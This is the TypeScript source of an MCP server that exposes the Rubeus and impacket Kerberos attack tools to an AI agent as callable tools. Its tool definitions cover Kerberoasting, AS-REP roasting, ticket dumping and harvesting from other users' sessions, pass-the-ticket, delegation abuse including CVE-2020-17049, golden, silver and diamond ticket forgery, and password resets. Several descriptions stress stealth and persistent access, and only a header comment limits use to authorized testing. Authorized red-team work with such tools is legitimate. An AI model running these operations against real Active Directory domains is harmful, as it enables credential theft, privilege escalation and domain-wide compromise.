#!/usr/bin/env node
/**
 * Rubeus MCP Server
 *
 * A comprehensive MCP server for Kerberos abuse operations using Rubeus.
 * Supports both native Rubeus execution on Windows and impacket-based
 * execution on Linux/macOS for cross-platform Kerberos attacks.
 *
 * SECURITY WARNING: This tool is intended for authorized security testing only.
 * Unauthorized use against systems you do not own or have permission to test
 * is illegal and unethical.
 */

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
} from "@modelcontextprotocol/sdk/types.js";
import { spawn, exec } from "child_process";
import { promisify } from "util";
import * as path from "path";
import * as fs from "fs";
import * as os from "os";

const execAsync = promisify(exec);

// Configuration
interface RubeusConfig {
  rubeusPath?: string;           // Path to Rubeus.exe (Windows)
  impacketPath?: string;         // Path to impacket scripts
  outputDir?: string;            // Directory for output files
  defaultDomain?: string;        // Default AD domain
  defaultDC?: string;            // Default domain controller
  timeout?: number;              // Command timeout in ms
  useImpacket?: boolean;         // Force impacket mode on all platforms
}

const config: RubeusConfig = {
  rubeusPath: process.env.RUBEUS_PATH || "Rubeus.exe",
  impacketPath: process.env.IMPACKET_PATH || "",
  outputDir: process.env.RUBEUS_OUTPUT_DIR || path.join(os.tmpdir(), "rubeus-mcp"),
  defaultDomain: process.env.RUBEUS_DOMAIN,
  defaultDC: process.env.RUBEUS_DC,
  timeout: parseInt(process.env.RUBEUS_TIMEOUT || "300000"),
  useImpacket: process.env.RUBEUS_USE_IMPACKET === "true" || os.platform() !== "win32",
};

// Ensure output directory exists
if (!fs.existsSync(config.outputDir!)) {
  fs.mkdirSync(config.outputDir!, { recursive: true });
}

// Helper functions
function buildRubeusCommand(action: string, params: Record<string, any>): string[] {
  const args: string[] = [action];

  for (const [key, value] of Object.entries(params)) {
    if (value === undefined || value === null || value === "") continue;
    if (typeof value === "boolean") {
      if (value) args.push(`/${key}`);
    } else {
      args.push(`/${key}:${value}`);
    }
  }

  return args;
}

function buildImpacketCommand(tool: string, params: Record<string, any>): { cmd: string; args: string[] } {
  const impacketTool = config.impacketPath
    ? path.join(config.impacketPath, tool)
    : tool;

  const args: string[] = [];

  // Build target specification
  if (params.domain && params.user) {
    if (params.password) {
      args.push(`${params.domain}/${params.user}:${params.password}`);
    } else if (params.hashes) {
      args.push(`${params.domain}/${params.user}`);
      args.push("-hashes", params.hashes);
    } else if (params.aesKey) {
      args.push(`${params.domain}/${params.user}`);
      args.push("-aesKey", params.aesKey);
    } else if (params.ticket) {
      args.push(`${params.domain}/${params.user}`);
      args.push("-k", "-no-pass");
    }
  }

  // Add DC target if specified
  if (params.dc) {
    args.push("-dc-ip", params.dc);
  }

  // Add output file if specified
  if (params.outfile) {
    args.push("-outputfile", params.outfile);
  }

  return { cmd: impacketTool, args };
}

async function executeCommand(
  cmd: string,
  args: string[],
  options: { timeout?: number; cwd?: string } = {}
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  return new Promise((resolve) => {
    const timeout = options.timeout || config.timeout;
    const child = spawn(cmd, args, {
      cwd: options.cwd || config.outputDir,
      shell: os.platform() === "win32",
      timeout,
    });

    let stdout = "";
    let stderr = "";

    child.stdout?.on("data", (data) => {
      stdout += data.toString();
    });

    child.stderr?.on("data", (data) => {
      stderr += data.toString();
    });

    child.on("close", (code) => {
      resolve({ stdout, stderr, exitCode: code || 0 });
    });

    child.on("error", (err) => {
      resolve({ stdout, stderr: err.message, exitCode: 1 });
    });
  });
}

async function executeRubeus(action: string, params: Record<string, any>): Promise<string> {
  if (config.useImpacket) {
    return executeImpacketEquivalent(action, params);
  }

  const args = buildRubeusCommand(action, params);
  const result = await executeCommand(config.rubeusPath!, args);

  if (result.exitCode !== 0) {
    throw new Error(`Rubeus ${action} failed: ${result.stderr || result.stdout}`);
  }

  return result.stdout;
}

async function executeImpacketEquivalent(action: string, params: Record<string, any>): Promise<string> {
  // Map Rubeus actions to impacket tools
  const impacketMap: Record<string, { tool: string; transform: (p: any) => any }> = {
    asktgt: {
      tool: "getTGT.py",
      transform: (p) => p,
    },
    asktgs: {
      tool: "getST.py",
      transform: (p) => ({ ...p, spn: p.service }),
    },
    kerberoast: {
      tool: "GetUserSPNs.py",
      transform: (p) => ({ ...p, request: true }),
    },
    asreproast: {
      tool: "GetNPUsers.py",
      transform: (p) => ({ ...p, usersfile: p.userfile, format: p.format || "hashcat" }),
    },
    s4u: {
      tool: "getST.py",
      transform: (p) => ({ ...p, impersonate: p.impersonateuser, spn: p.msdsspn }),
    },
    dump: {
      tool: "secretsdump.py",
      transform: (p) => p,
    },
    hash: {
      tool: "python3",
      transform: (p) => p,
    },
  };

  const mapping = impacketMap[action];
  if (!mapping) {
    throw new Error(`No impacket equivalent for Rubeus action: ${action}. ` +
      `This action requires native Rubeus on Windows.`);
  }

  const transformedParams = mapping.transform(params);
  const { cmd, args } = buildImpacketCommand(mapping.tool, transformedParams);

  const result = await executeCommand(cmd, args);

  if (result.exitCode !== 0 && !result.stdout.includes("$krb5")) {
    throw new Error(`Impacket ${mapping.tool} failed: ${result.stderr || result.stdout}`);
  }

  return result.stdout + (result.stderr ? `\n[STDERR]: ${result.stderr}` : "");
}

// Tool definitions
const tools: Tool[] = [
  // ============== TICKET REQUESTS ==============
  {
    name: "rubeus_asktgt",
    description: `Request a Ticket Granting Ticket (TGT) using user credentials.

Supports multiple authentication methods:
- Password-based (cleartext or encrypted)
- Hash-based (RC4/NTLM, AES128, AES256, DES)
- Certificate-based (PKINIT)

The TGT can be saved to a file, applied to the current session (PTT), or returned as base64.

Example use cases:
- Obtain TGT for lateral movement
- Test credential validity
- Support subsequent ticket operations`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Target username" },
        domain: { type: "string", description: "Target domain (FQDN or NetBIOS)" },
        password: { type: "string", description: "User's plaintext password" },
        rc4: { type: "string", description: "RC4/NTLM hash of user password" },
        aes256: { type: "string", description: "AES256 key for authentication" },
        aes128: { type: "string", description: "AES128 key for authentication" },
        des: { type: "string", description: "DES key for authentication" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        outfile: { type: "string", description: "Output file for ticket (.kirbi)" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        opsec: { type: "boolean", description: "Use OPSEC-safe options" },
        nopac: { type: "boolean", description: "Request TGT without PAC" },
        enctype: { type: "string", enum: ["rc4", "aes128", "aes256", "des"], description: "Preferred encryption type" },
        certificate: { type: "string", description: "Certificate for PKINIT auth (file path or thumbprint)" },
        certificatepassword: { type: "string", description: "Certificate password if encrypted" },
        proxyurl: { type: "string", description: "KDC proxy URL" },
      },
      required: ["user"],
    },
  },
  {
    name: "rubeus_asktgs",
    description: `Request Service Tickets (TGS) for specified Service Principal Names (SPNs).

Requires a valid TGT (provided as ticket parameter or from current session).
Can request tickets for multiple SPNs in one operation.

Use cases:
- Access specific services after obtaining TGT
- Kerberoasting alternative (request specific SPN tickets)
- S4U2Self/S4U2Proxy prerequisite`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "Base64 encoded TGT or path to .kirbi file" },
        service: { type: "string", description: "Target SPN(s), comma-separated for multiple" },
        domain: { type: "string", description: "Target domain" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        outfile: { type: "string", description: "Output file for ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        enctype: { type: "string", enum: ["rc4", "aes128", "aes256"], description: "Preferred encryption type" },
        opsec: { type: "boolean", description: "Use OPSEC-safe options" },
        enterprise: { type: "boolean", description: "Enterprise principal name format" },
        u2u: { type: "boolean", description: "User-to-User authentication" },
        targetuser: { type: "string", description: "Target user for U2U" },
        tgs: { type: "string", description: "Provide TGS for renewal" },
        servicekey: { type: "string", description: "Service key for decryption" },
        asrepkey: { type: "string", description: "AS-REP key for decryption" },
        keylist: { type: "boolean", description: "Request using key list" },
      },
      required: ["service"],
    },
  },
  {
    name: "rubeus_renew",
    description: `Renew an existing TGT to extend its validity period.

Can optionally auto-renew continuously until the renewable lifetime expires.
Useful for maintaining persistent access without re-authentication.`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "Base64 encoded TGT or path to .kirbi file" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        outfile: { type: "string", description: "Output file for renewed ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        autorenew: { type: "boolean", description: "Automatically renew ticket periodically" },
      },
      required: ["ticket"],
    },
  },

  // ============== ROASTING ATTACKS ==============
  {
    name: "rubeus_kerberoast",
    description: `Perform Kerberoasting attack to extract service account password hashes.

Requests TGS tickets for accounts with SPNs, which are encrypted with the
service account's password hash. These can be cracked offline.

Features:
- Target specific users or all SPN accounts
- AES vs RC4 OPSEC considerations
- Statistics mode for reconnaissance
- LDAP filtering for targeted attacks
- Password age filtering

Output format compatible with hashcat (mode 13100/19700) or John.`,
    inputSchema: {
      type: "object",
      properties: {
        domain: { type: "string", description: "Target domain" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        user: { type: "string", description: "Target specific user account" },
        spn: { type: "string", description: "Target specific SPN" },
        spns: { type: "string", description: "File containing target SPNs" },
        ou: { type: "string", description: "Target specific OU" },
        outfile: { type: "string", description: "Output file for hashes" },
        simple: { type: "boolean", description: "Simple output format" },
        nowrap: { type: "boolean", description: "Don't wrap hash output" },
        aes: { type: "boolean", description: "Request AES tickets (stealthier)" },
        rc4opsec: { type: "boolean", description: "Only roast RC4-enabled accounts (OPSEC)" },
        stats: { type: "boolean", description: "Show statistics only, don't request tickets" },
        creduser: { type: "string", description: "Alternate credential username" },
        credpassword: { type: "string", description: "Alternate credential password" },
        ldapfilter: { type: "string", description: "Custom LDAP filter" },
        pwdsetafter: { type: "string", description: "Only accounts with password set after date" },
        pwdsetbefore: { type: "string", description: "Only accounts with password set before date" },
        resultlimit: { type: "number", description: "Limit number of results" },
        delay: { type: "number", description: "Delay between requests (ms)" },
        jitter: { type: "number", description: "Jitter percentage for delay" },
        ticket: { type: "string", description: "Use existing TGT" },
        tgtdeleg: { type: "boolean", description: "Use tgtdeleg trick to obtain TGT" },
        enterprise: { type: "boolean", description: "Use enterprise principal names" },
      },
    },
  },
  {
    name: "rubeus_asreproast",
    description: `Perform AS-REP Roasting against accounts that don't require pre-authentication.

Targets accounts with "Do not require Kerberos preauthentication" enabled.
The AS-REP response contains data encrypted with the user's password hash.

Features:
- Target specific users or enumerate vulnerable accounts
- Output in hashcat or John format
- OU-based targeting

Output format: hashcat mode 18200 or John (jumbo).`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Target specific user" },
        domain: { type: "string", description: "Target domain" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        ou: { type: "string", description: "Target specific OU" },
        outfile: { type: "string", description: "Output file for hashes" },
        format: { type: "string", enum: ["hashcat", "john"], description: "Output format (default: john)" },
        ldaps: { type: "boolean", description: "Use LDAPS for queries" },
        nowrap: { type: "boolean", description: "Don't wrap hash output" },
        creduser: { type: "string", description: "Alternate credential username" },
        credpassword: { type: "string", description: "Alternate credential password" },
        des: { type: "boolean", description: "Request DES encryption (weak)" },
        ldapfilter: { type: "string", description: "Custom LDAP filter" },
      },
    },
  },

  // ============== TICKET EXTRACTION ==============
  {
    name: "rubeus_tgtdeleg",
    description: `Extract a usable TGT for the current user without elevation.

Uses Kerberos GSS-API to abuse the delegation mechanism and retrieve
the current user's TGT. This is the "tgt::deleg" technique from Kekeo.

No admin/elevation required - works with standard user permissions.
The extracted TGT can be used for pass-the-ticket attacks.`,
    inputSchema: {
      type: "object",
      properties: {
        target: { type: "string", description: "Target SPN for the delegation trick (optional)" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
      },
    },
  },
  {
    name: "rubeus_dump",
    description: `Dump all Kerberos tickets from memory (current or all sessions).

Extracts tickets from the current logon session or, with elevation,
from all logon sessions on the system.

Tickets are output as base64-encoded kirbi format.`,
    inputSchema: {
      type: "object",
      properties: {
        luid: { type: "string", description: "Target specific LUID (requires elevation)" },
        user: { type: "string", description: "Filter by username" },
        service: { type: "string", description: "Filter by service name" },
        server: { type: "string", description: "Filter by server name" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
      },
    },
  },
  {
    name: "rubeus_harvest",
    description: `Continuously monitor for and harvest new TGTs.

Runs in a loop, extracting new TGTs as they appear and optionally
auto-renewing them to maintain access.

Useful for capturing tickets from other users logging in.`,
    inputSchema: {
      type: "object",
      properties: {
        monitorinterval: { type: "number", description: "Interval to check for new tickets (seconds)" },
        displayinterval: { type: "number", description: "Interval to display harvested tickets (seconds)" },
        targetuser: { type: "string", description: "Only harvest tickets for specific user" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        registry: { type: "boolean", description: "Store tickets in registry" },
        runfor: { type: "number", description: "Run for specified duration (seconds)" },
      },
    },
  },
  {
    name: "rubeus_monitor",
    description: `Monitor for new TGTs without harvesting/renewal.

Watches for new TGT events and displays them as they occur.
Lighter weight than harvest - just observation.`,
    inputSchema: {
      type: "object",
      properties: {
        interval: { type: "number", description: "Check interval (seconds, default 60)" },
        targetuser: { type: "string", description: "Only monitor specific user" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        registry: { type: "boolean", description: "Store tickets in registry" },
        runfor: { type: "number", description: "Run for specified duration (seconds)" },
      },
    },
  },
  {
    name: "rubeus_triage",
    description: `Display a quick summary of all tickets in current/all sessions.

Shows ticket information without full extraction - useful for
reconnaissance of what tickets are available.`,
    inputSchema: {
      type: "object",
      properties: {
        luid: { type: "string", description: "Target specific LUID" },
        user: { type: "string", description: "Filter by username" },
        service: { type: "string", description: "Filter by service name" },
        server: { type: "string", description: "Filter by server name" },
      },
    },
  },
  {
    name: "rubeus_klist",
    description: `List detailed information about Kerberos tickets.

Similar to the native klist command but with more detail and
filtering options.`,
    inputSchema: {
      type: "object",
      properties: {
        luid: { type: "string", description: "Target specific LUID" },
        user: { type: "string", description: "Filter by username" },
        service: { type: "string", description: "Filter by service name" },
        server: { type: "string", description: "Filter by server name" },
      },
    },
  },

  // ============== TICKET OPERATIONS ==============
  {
    name: "rubeus_ptt",
    description: `Pass-the-ticket: Apply a Kerberos ticket to the current logon session.

Imports a ticket (from base64 or .kirbi file) into the current session,
enabling access to resources as the ticket's principal.`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "Base64 encoded ticket or path to .kirbi file" },
        luid: { type: "string", description: "Target LUID (requires elevation)" },
      },
      required: ["ticket"],
    },
  },
  {
    name: "rubeus_purge",
    description: `Purge Kerberos tickets from a logon session.

Removes all tickets from the current session, or with elevation,
from a specific LUID.`,
    inputSchema: {
      type: "object",
      properties: {
        luid: { type: "string", description: "Target LUID (requires elevation)" },
      },
    },
  },
  {
    name: "rubeus_describe",
    description: `Parse and display detailed information about a Kerberos ticket.

Can decrypt ticket contents if the appropriate key is provided.
Useful for analyzing captured tickets.`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "Base64 encoded ticket or path to .kirbi file" },
        servicekey: { type: "string", description: "Service key for decryption" },
        krbkey: { type: "string", description: "Kerberos key for decryption" },
        asrepkey: { type: "string", description: "AS-REP key for decryption" },
        serviceuser: { type: "string", description: "Service user context" },
        servicedomain: { type: "string", description: "Service domain context" },
      },
      required: ["ticket"],
    },
  },
  {
    name: "rubeus_tgssub",
    description: `Substitute the service name in a service ticket.

Replaces the SPN in an existing TGS with a different service name.
Useful when you have a ticket for one service but need access to another
on the same server (requires same service account).`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "Base64 encoded ticket or path to .kirbi file" },
        altservice: { type: "string", description: "New service name to substitute" },
        srealm: { type: "string", description: "Service realm" },
        ptt: { type: "boolean", description: "Pass-the-ticket after substitution" },
        luid: { type: "string", description: "Target LUID for PTT" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
      },
      required: ["ticket", "altservice"],
    },
  },

  // ============== DELEGATION ABUSE ==============
  {
    name: "rubeus_s4u",
    description: `Perform S4U (Service for User) constrained/unconstrained delegation abuse.

Implements:
- S4U2Self: Obtain service ticket to yourself on behalf of another user
- S4U2Proxy: Use constrained delegation to obtain ticket to target service

This is a powerful technique for privilege escalation when you control
an account with delegation rights.

Supports:
- User-based authentication (password/hash)
- Ticket-based authentication
- Bronze Bit exploitation (CVE-2020-17049)
- OPSEC-safe options`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Account with delegation rights" },
        domain: { type: "string", description: "Domain name" },
        rc4: { type: "string", description: "RC4/NTLM hash of delegating account" },
        aes256: { type: "string", description: "AES256 key of delegating account" },
        aes128: { type: "string", description: "AES128 key of delegating account" },
        ticket: { type: "string", description: "TGT of delegating account" },
        impersonateuser: { type: "string", description: "User to impersonate" },
        msdsspn: { type: "string", description: "Target SPN for S4U2Proxy" },
        altservice: { type: "string", description: "Alternative service(s) for SPN substitution" },
        dc: { type: "string", description: "Domain controller IP/hostname" },
        outfile: { type: "string", description: "Output file for ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        self: { type: "boolean", description: "Only perform S4U2Self" },
        opsec: { type: "boolean", description: "Use OPSEC-safe options" },
        force: { type: "boolean", description: "Force with non-AES256 keys" },
        bronzebit: { type: "boolean", description: "Exploit CVE-2020-17049" },
        nopac: { type: "boolean", description: "Request ticket without PAC" },
        createnetonly: { type: "string", description: "Program to spawn in netonly session" },
        s4uproxytarget: { type: "string", description: "Final delegation target" },
        s4utransitedservices: { type: "string", description: "Transited services for PAC" },
        targetdomain: { type: "string", description: "Target domain if different" },
        targetdc: { type: "string", description: "Target DC if different" },
      },
      required: ["impersonateuser"],
    },
  },

  // ============== TICKET FORGERY ==============
  {
    name: "rubeus_golden",
    description: `Forge a Golden Ticket (forged TGT with krbtgt hash).

Creates a TGT that grants domain-wide access. Requires:
- Domain SID
- krbtgt account hash (RC4 or AES)
- Target username and domain

The golden ticket bypasses normal authentication and can be used
for persistent domain access.`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Username for the forged ticket" },
        domain: { type: "string", description: "Domain FQDN" },
        sid: { type: "string", description: "Domain SID" },
        rc4: { type: "string", description: "krbtgt RC4/NTLM hash" },
        aes256: { type: "string", description: "krbtgt AES256 key" },
        aes128: { type: "string", description: "krbtgt AES128 key" },
        des: { type: "string", description: "krbtgt DES key" },
        dc: { type: "string", description: "Domain controller" },
        ldap: { type: "boolean", description: "Retrieve info via LDAP (requires auth)" },
        groups: { type: "string", description: "Group SIDs to include (comma-separated)" },
        sids: { type: "string", description: "Extra SIDs for SID history" },
        id: { type: "string", description: "User ID (RID)" },
        pgid: { type: "string", description: "Primary group ID" },
        outfile: { type: "string", description: "Output file for ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        starttime: { type: "string", description: "Ticket start time" },
        endtime: { type: "string", description: "Ticket end time" },
        renewtill: { type: "string", description: "Renewable until time" },
        rangeend: { type: "string", description: "End of time range for ticket" },
        rangeinterval: { type: "string", description: "Interval for ticket time range" },
      },
      required: ["user", "domain"],
    },
  },
  {
    name: "rubeus_silver",
    description: `Forge a Silver Ticket (forged TGS with service account hash).

Creates a service ticket for a specific service. Requires:
- Service account hash
- Service SPN
- Domain information

Silver tickets grant access to a specific service without touching the DC.`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Username for the forged ticket" },
        domain: { type: "string", description: "Domain FQDN" },
        sid: { type: "string", description: "Domain SID" },
        service: { type: "string", description: "Target service SPN" },
        rc4: { type: "string", description: "Service account RC4/NTLM hash" },
        aes256: { type: "string", description: "Service account AES256 key" },
        aes128: { type: "string", description: "Service account AES128 key" },
        des: { type: "string", description: "Service account DES key" },
        ldap: { type: "boolean", description: "Retrieve info via LDAP" },
        groups: { type: "string", description: "Group SIDs to include" },
        sids: { type: "string", description: "Extra SIDs for SID history" },
        id: { type: "string", description: "User ID (RID)" },
        outfile: { type: "string", description: "Output file for ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        krbkey: { type: "string", description: "Kerberos session key" },
        cname: { type: "string", description: "Client name" },
        crealm: { type: "string", description: "Client realm" },
        s4uproxytarget: { type: "string", description: "S4U proxy target" },
        s4utransitedservices: { type: "string", description: "S4U transited services" },
      },
      required: ["user", "domain", "service"],
    },
  },
  {
    name: "rubeus_diamond",
    description: `Forge a Diamond Ticket (modified legitimate TGT).

Requests a legitimate TGT and then modifies it with new PAC data.
More stealthy than golden tickets as it starts with a real ticket.

Requires krbtgt key for re-signing.`,
    inputSchema: {
      type: "object",
      properties: {
        user: { type: "string", description: "Username to authenticate as" },
        domain: { type: "string", description: "Domain FQDN" },
        password: { type: "string", description: "User password" },
        rc4: { type: "string", description: "User RC4/NTLM hash" },
        aes256: { type: "string", description: "User AES256 key" },
        krbkey: { type: "string", description: "krbtgt key for re-signing" },
        ticketuser: { type: "string", description: "Username to put in modified ticket" },
        ticketuserid: { type: "string", description: "User ID for modified ticket" },
        groups: { type: "string", description: "Group SIDs for modified PAC" },
        sids: { type: "string", description: "Extra SIDs for SID history" },
        dc: { type: "string", description: "Domain controller" },
        outfile: { type: "string", description: "Output file for ticket" },
        ptt: { type: "boolean", description: "Pass-the-ticket to current session" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
        certificate: { type: "string", description: "Certificate for PKINIT" },
        certificatepassword: { type: "string", description: "Certificate password" },
        tgtdeleg: { type: "boolean", description: "Use tgtdeleg trick for initial TGT" },
        createnetonly: { type: "string", description: "Program to spawn" },
      },
      required: ["domain", "krbkey"],
    },
  },

  // ============== UTILITY ==============
  {
    name: "rubeus_hash",
    description: `Calculate Kerberos password hashes from plaintext.

Computes the various Kerberos encryption keys from a password:
- RC4_HMAC (NTLM)
- AES128_CTS_HMAC_SHA1
- AES256_CTS_HMAC_SHA1
- DES_CBC_MD5

These hashes can be used for ticket requests and other operations.`,
    inputSchema: {
      type: "object",
      properties: {
        password: { type: "string", description: "Password to hash" },
        user: { type: "string", description: "Username (required for AES salt)" },
        domain: { type: "string", description: "Domain (required for AES salt)" },
      },
      required: ["password"],
    },
  },
  {
    name: "rubeus_changepw",
    description: `Change/reset a user's password using a TGT.

Uses the Kerberos Set Password protocol (Aorato technique) to
change a user's password with just their TGT.

Can target other users with appropriate permissions.`,
    inputSchema: {
      type: "object",
      properties: {
        ticket: { type: "string", description: "TGT for authentication" },
        new: { type: "string", description: "New password to set" },
        dc: { type: "string", description: "Domain controller" },
        targetuser: { type: "string", description: "Target user (if different from ticket principal)" },
        targetdomain: { type: "string", description: "Target domain (if different)" },
      },
      required: ["ticket", "new"],
    },
  },
  {
    name: "rubeus_createnetonly",
    description: `Create a new process with network credentials (logon type 9).

Creates a process that uses different credentials for network authentication.
Useful for applying tickets to a separate process.

The process can be hidden or visible.`,
    inputSchema: {
      type: "object",
      properties: {
        program: { type: "string", description: "Program to execute" },
        show: { type: "boolean", description: "Show the window (default: hidden)" },
        ticket: { type: "string", description: "Ticket to apply to new process" },
        domain: { type: "string", description: "Domain for credentials" },
        username: { type: "string", description: "Username for credentials" },
        password: { type: "string", description: "Password for credentials" },
      },
      required: ["program"],
    },
  },
  {
    name: "rubeus_currentluid",
    description: `Display the current user's Logon Unique ID (LUID).

Returns the LUID of the current logon session, which is needed
for various ticket operations.`,
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
  {
    name: "rubeus_logonsession",
    description: `Display information about logon sessions.

Shows detailed information about the current or specified logon session.`,
    inputSchema: {
      type: "object",
      properties: {
        current: { type: "boolean", description: "Show current session only" },
        luid: { type: "string", description: "Show specific LUID" },
      },
    },
  },
  {
    name: "rubeus_asrep2kirbi",
    description: `Convert an AS-REP response to kirbi ticket format.

Takes a raw AS-REP response and converts it to a usable kirbi ticket
using the provided key.`,
    inputSchema: {
      type: "object",
      properties: {
        asrep: { type: "string", description: "Base64 AS-REP or file path" },
        key: { type: "string", description: "Decryption key (password)" },
        keyhex: { type: "string", description: "Decryption key (hex)" },
        enctype: { type: "string", enum: ["rc4", "aes128", "aes256", "des"], description: "Encryption type" },
        ptt: { type: "boolean", description: "Pass-the-ticket after conversion" },
        luid: { type: "string", description: "Target LUID for PTT" },
        outfile: { type: "string", description: "Output file for kirbi" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
      },
      required: ["asrep"],
    },
  },
  {
    name: "rubeus_kirbi",
    description: `Modify a kirbi ticket's session key.

Changes the session key in an existing kirbi ticket.
Useful for advanced ticket manipulation.`,
    inputSchema: {
      type: "object",
      properties: {
        kirbi: { type: "string", description: "Base64 kirbi or file path" },
        sessionkey: { type: "string", description: "New session key" },
        sessionetype: { type: "string", description: "Session key encryption type" },
        ptt: { type: "boolean", description: "Pass-the-ticket after modification" },
        luid: { type: "string", description: "Target LUID for PTT" },
        outfile: { type: "string", description: "Output file" },
        nowrap: { type: "boolean", description: "Don't wrap base64 output" },
      },
      required: ["kirbi", "sessionkey"],
    },
  },

  // ============== CROSS-PLATFORM HELPERS ==============
  {
    name: "rubeus_check_environment",
    description: `Check the current environment and available tools.

Detects whether running on Windows (native Rubeus) or Linux/macOS (impacket mode).
Lists available tools and configuration.`,
    inputSchema: {
      type: "object",
      properties: {},
    },
  },
];

// Tool handlers
async function handleTool(name: string, args: Record<string, unknown>): Promise<string> {
  // Special handler for environment check
  if (name === "rubeus_check_environment") {
    const platform = os.platform();
    const isWindows = platform === "win32";

    let rubeusAvailable = false;
    let impacketAvailable = false;

    // Check for Rubeus
    if (isWindows) {
      try {
        await execAsync(`where ${config.rubeusPath}`);
        rubeusAvailable = true;
      } catch {
        // Try common paths
        const commonPaths = [
          "C:\\Tools\\Rubeus.exe",
          "C:\\Rubeus\\Rubeus.exe",
          path.join(os.homedir(), "Tools", "Rubeus.exe"),
        ];
        for (const p of commonPaths) {
          if (fs.existsSync(p)) {
            config.rubeusPath = p;
            rubeusAvailable = true;
            break;
          }
        }
      }
    }

    // Check for impacket
    try {
      await execAsync("python3 -c 'import impacket'");
      impacketAvailable = true;
    } catch {
      try {
        await execAsync("impacket-getTGT -h");
        impacketAvailable = true;
      } catch {
        // impacket not available
      }
    }

    return JSON.stringify({
      platform,
      isWindows,
      rubeusAvailable,
      impacketAvailable,
      mode: config.useImpacket ? "impacket" : "rubeus",
      config: {
        rubeusPath: config.rubeusPath,
        impacketPath: config.impacketPath || "(system PATH)",
        outputDir: config.outputDir,
        defaultDomain: config.defaultDomain || "(not set)",
        defaultDC: config.defaultDC || "(not set)",
        timeout: config.timeout,
      },
      recommendations: !isWindows && !impacketAvailable
        ? ["Install impacket: pip install impacket"]
        : isWindows && !rubeusAvailable
        ? ["Download Rubeus from GhostPack and set RUBEUS_PATH environment variable"]
        : [],
    }, null, 2);
  }

  // Extract action from tool name (remove rubeus_ prefix)
  const action = name.replace(/^rubeus_/, "");

  // Add default domain and DC if not specified
  const params = { ...args } as Record<string, any>;
  if (!params.domain && config.defaultDomain) {
    params.domain = config.defaultDomain;
  }
  if (!params.dc && config.defaultDC) {
    params.dc = config.defaultDC;
  }

  try {
    const result = await executeRubeus(action, params);
    return result;
  } catch (error) {
    const err = error as Error;
    return JSON.stringify({
      error: true,
      message: err.message,
      action,
      params: Object.keys(params).filter(k => !k.includes("password") && !k.includes("key") && !k.includes("hash")),
      suggestion: config.useImpacket
        ? "Ensure impacket is installed (pip install impacket) and accessible in PATH"
        : "Ensure Rubeus.exe is accessible and you're running on Windows with appropriate permissions",
    }, null, 2);
  }
}

// Server setup
const server = new Server(
  {
    name: "rubeus-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// Register handlers
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return { tools };
});

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    const result = await handleTool(name, args as Record<string, unknown>);
    return {
      content: [{ type: "text", text: result }],
    };
  } catch (error) {
    const err = error as Error;
    return {
      content: [{ type: "text", text: `Error: ${err.message}` }],
      isError: true,
    };
  }
});

// Main entry point
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Rubeus MCP server running on stdio");
  console.error(`Mode: ${config.useImpacket ? "impacket" : "native rubeus"}`);
  console.error(`Output directory: ${config.outputDir}`);
}

main().catch((error) => {
  console.error("Fatal error:", error);
  process.exit(1);
});
